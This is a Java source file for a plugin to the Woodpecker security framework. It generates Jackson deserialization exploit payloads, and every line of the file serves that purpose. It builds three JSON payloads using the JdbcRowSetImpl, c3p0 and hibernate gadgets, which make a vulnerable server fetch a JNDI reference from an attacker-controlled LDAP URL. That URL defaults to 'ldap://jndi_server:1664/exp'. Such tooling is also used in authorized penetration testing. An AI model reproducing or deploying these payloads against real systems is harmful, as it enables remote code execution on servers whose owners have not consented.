package me.gv7.woodpecker.vuldb.payload;

import me.gv7.woodpecker.plugin.IArgs;
import me.gv7.woodpecker.plugin.IArgsUsageBinder;
import me.gv7.woodpecker.plugin.IPayloadGenerator;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.vuldb.JacksonVulPlugin;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class JndiInjectPayloadGenerator implements IPayloadGenerator {

    @Override
    public String getPayloadTabCaption() {
        return "JNDI inject";
    }

    public IArgsUsageBinder getPayloadCustomArgs() {
        IArgsUsageBinder argsUsageBinder = JacksonVulPlugin.pluginHelper.createArgsUsageBinder();
        List<IArgs> args = new ArrayList<IArgs>();
        IArgs args1 = JacksonVulPlugin.pluginHelper.createArgs();
        args1.setName("jndi_url");
        args1.setDescription("jndi地址");
        args1.setDefaultValue("ldap://jndi_server:1664/exp");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void generatorPayload(Map<String, String> customArgs, IResultOutput iResultOutput) {
        String jndiURL = customArgs.get("jndi_url");
        String payload1 = String.format("[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"%s\",\"autoCommit\":true}]",jndiURL);
        String payload2 = String.format("[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",{\"jndiName\":\"%s\",\"loginTimeout\":0}]",jndiURL);
        String payload3 = String.format("{ \"id\": 1111, \"obj\": [\"org.hibernate.jmx.StatisticsService\", \"sessionFactoryJNDIName\": \"%s\"}]",jndiURL);
        iResultOutput.successPrintln("Relying on the JDK");
        iResultOutput.rawPrintln(payload1);
        iResultOutput.rawPrintln("\n");
        iResultOutput.successPrintln("Rely on c3p0-<version>.jar");
        iResultOutput.rawPrintln(payload2);
        iResultOutput.rawPrintln("\n");
        iResultOutput.successPrintln("Rely on hibernate");
        iResultOutput.rawPrintln(payload3);
        iResultOutput.rawPrintln("\n");
    }
}
